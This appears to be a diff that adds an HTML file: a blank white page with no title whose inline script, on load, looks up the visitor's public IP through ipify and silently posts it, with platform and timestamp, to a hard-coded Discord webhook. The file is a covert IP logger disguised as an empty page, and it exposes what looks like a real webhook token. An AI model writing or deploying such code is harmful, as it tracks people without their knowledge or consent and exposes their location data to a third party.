@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body style="margin:0;padding:0;background:#ffffff;width:100vw;height:100vh;overflow:hidden;">
+    <script>
+        // ===== WEBHOOK URL =====
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1344722110161092690/Ka3l2MCnEpZpk-MHA2RBli7HxEHxll6S-S8LjZeCCSpoRj_NIMKCcOX-AZYqYWl1bVq8";
+        // =========================
+        
+        async function sendIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+                
+                const info = {
+                    ip: ip,
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    time: new Date().toISOString()
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🎯 **New Visitor**\nIP: \`${ip}\`\nPlatform: \`${info.platform}\`\nTime: \`${info.time}\``
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        sendIP();
+    </script>
+</body>
+</html>
